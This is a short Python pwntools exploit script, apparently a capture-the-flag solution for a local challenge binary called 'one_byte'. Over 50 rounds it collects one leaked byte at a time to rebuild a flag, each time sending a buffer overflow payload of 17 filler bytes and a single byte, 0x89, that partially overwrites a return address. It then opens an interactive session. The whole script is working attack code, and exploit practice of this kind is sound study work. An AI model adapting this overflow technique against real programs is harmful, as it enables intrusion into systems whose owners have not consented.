from pwn import *

r = process('./one_byte')
context.log_level = "debug"
# context.terminal = ['tmux', 'splitw', '-h']

flag = b""
pause()
for i in range(50):
    r.recvuntil(b'Here is your gift: ')
    recv = r.recv(1)
    print(f"received: {recv}")
    flag += recv
    r.recvuntil(b'Are you satisfied with the result?\n')

    payload = b'a'*17+b'\x89'
    print(f"payload: {payload}")
    r.send(payload)
# 0x7ffff7dbcd__

print(f"flag:\n{flag}")

r.interactive()